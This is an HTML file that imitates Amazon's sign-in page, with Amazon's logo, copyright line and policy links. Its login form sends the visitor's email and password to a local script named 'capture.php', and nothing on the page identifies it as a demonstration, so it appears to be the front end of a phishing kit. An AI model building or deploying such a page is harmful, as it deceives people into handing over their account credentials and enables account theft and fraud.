<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign-In</title>
    <link rel="icon" href="./assets/amazon-icon.jpg" type="image/x-icon">
    <link rel="stylesheet" href="./style.css">
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
        </div>
        <div class="signin-box">
            <h1>Sign in</h1>
            <form action="./capture.php" method="POST">
                <label for="email">Email or mobile phone number</label>
                <input type="email" id="email" name="email" required>
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
                <button type="submit" class="continue-button">Sign-In</button>
                <p class="terms">
                    By continuing, you agree to Amazon's 
                    <a href="#">Conditions of Use</a> and 
                    <a href="#">Privacy Notice</a>.
                </p>
                <a href="#" class="help-link">Need help?</a>
            </form>
            <hr>
            <p class="business-link">Buying for work? <a href="#">Shop on Amazon Business</a></p>
            <hr>
            <!-- <p class="new-user">New to Amazon?</p>
            <button class="create-account-button">Create your Amazon account</button> -->
        </div>
    </div>
    <footer>
        <a href="#">Conditions of Use</a>
        <a href="#">Privacy Notice</a>
        <a href="#">Help</a>
        <p>© 1996-2024, Amazon.com, Inc. or its affiliates</p>
    </footer>
</body>
</html>
